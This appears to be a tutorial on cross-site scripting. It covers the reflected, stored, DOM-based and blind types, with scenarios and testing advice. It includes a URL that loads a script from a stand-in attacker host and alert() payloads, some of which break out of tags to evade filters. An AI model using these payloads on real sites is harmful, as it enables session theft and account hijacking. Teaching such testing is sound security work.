<h2 align="center">Cross-Site Scripting aka XSS</h2>

Cross-Site Scripting is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

Cross-site scripting vulnerabilities are extremely common, we can find different type of XSS:

- Reflected XSS
- Stored XSS
- DOM Based XSS
- Blind XSS

<h4 align="center">Reflected XSS</h4>

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

<strong>Example Scenario:</strong>

A website where if you enter incorrect input, an error message is displayed. \n
The content of the error message gets taken from the <strong>error</strong> parameter in the query string and is built directly into the page source.

    www.example.com/?error=Error Message Displayed

If the application does not check for inputs apssed in the <b>error</b> parameter, it could lead to injecting malicious code, in this example loading a script from the attacker server/machine:

    www.example.com/?error=<script src="http://attackerserver.com/evil.js"></script>

<b>How to test for Reflected XSS:</b>

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

<b>Potential Impact:</b>

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.


<h4 align="center">Stored XSS</h4>


As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

<b>Example Scenario:</b>

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

<b>How to test for Reflected XSS:</b>

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

- Comments on a blog
- User profile information
- Website Listings

<b>Potential Impact:</b>

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

<b>NOTE:</b>
Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a drop-down menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads


<h4 align="center">DOM Based XSS</h4>

DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

A good place to get deeper in it: https://www.w3.org/TR/REC-DOM-Level-1/introduction.html

<b>How to test for Dom Based XSS:</b>


DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.


When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as <b>eval()</b>.


<h4 align="center">Blind XSS</h4>


Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

<b>Example Scenario:</b>

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

<b>Potential Impact:</b>

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

<b>How to test for Blind XSS:</b>

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

<h4 align="center">payloads basic and evasion examples</h4>

The most basic test PoC to enter in a form is:

    <script>alert('text here');</script>

This will prompt a pop up with the entered text and will right away point out an XSS vulnerability.

To mitigate this, the form could output it in a, input tag, but we can bypass it by closing it first:

    "><script>alert('text here');</script>

The <b>"></b> would close the input tag and add the malicious code.

Same would be for an output into a textarea where we close the tag first and inject our code:

    </textarea><script>alert('text here');</script>
